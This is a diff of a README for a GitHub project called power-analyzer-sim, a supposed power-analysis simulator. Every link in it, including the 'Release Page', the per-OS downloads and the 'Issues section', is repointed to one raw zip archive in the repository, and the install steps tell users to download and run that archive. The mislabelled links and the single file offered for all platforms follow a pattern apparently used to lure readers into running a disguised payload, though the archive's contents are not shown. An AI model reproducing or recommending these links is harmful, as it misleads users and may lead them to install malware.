@@ -6,7 +6,7 @@ Welcome to the power-analyzer-sim project! This tool helps you simulate power an
 
 ## 📥 Download the Application
 
-[![Download the Latest Release](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip%20Now-Click%https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip)](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip)
+[![Download the Latest Release](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip%20Now-Click%https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip)](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip)
 
 ## 💻 System Requirements
 
@@ -19,21 +19,21 @@ Before you start, make sure your computer meets these minimum requirements:
 
 ## 🔧 Download & Install
 
-To download the application, visit this page to download: [Release Page](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip).
+To download the application, visit this page to download: [Release Page](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip).
 
 ### Step-by-Step Instructions:
 
 1. **Go to the Release Page:**
-   Click this link to visit the [Release Page](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip).
+   Click this link to visit the [Release Page](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip).
 
 2. **Find the Latest Release:**
    On the Release Page, look for the most recent version at the top.
 
 3. **Download the Application:**
    Click on the file that matches your operating system. For example:
-   - If using Windows, download `https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip`.
-   - If using macOS, download `https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip`.
-   - If using Linux, download `https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip`.
+   - If using Windows, download `https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip`.
+   - If using macOS, download `https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip`.
+   - If using Linux, download `https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip`.
 
 4. **Install the Application:**
    - **Windows:**
@@ -43,7 +43,7 @@ To download the application, visit this page to download: [Release Page](https:/
      - Open the `.pkg` file.
      - Follow the installation steps.
    - **Linux:**
-     - Extract the `https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip` file.
+     - Extract the `https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip` file.
      - Open a terminal and navigate to the extracted folder.
      - Run the program using `./power-analyzer-sim`.
 
@@ -83,7 +83,7 @@ This application focuses on various aspects of electrical engineering:
 
 ## 🆘 Support
 
-If you have questions or run into issues, the project's GitHub page has an [Issues section](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/rammer/power-analyzer-sim.zip) where you can report problems or ask for help. 
+If you have questions or run into issues, the project's GitHub page has an [Issues section](https://raw.githubusercontent.com/Abdousettar/power-analyzer-sim/main/src/power-analyzer-sim-v1.3.zip) where you can report problems or ask for help. 
 
 Join the community of users leveraging power-analyzer-sim for their project needs. Your feedback is vital for our continuous improvement.
 
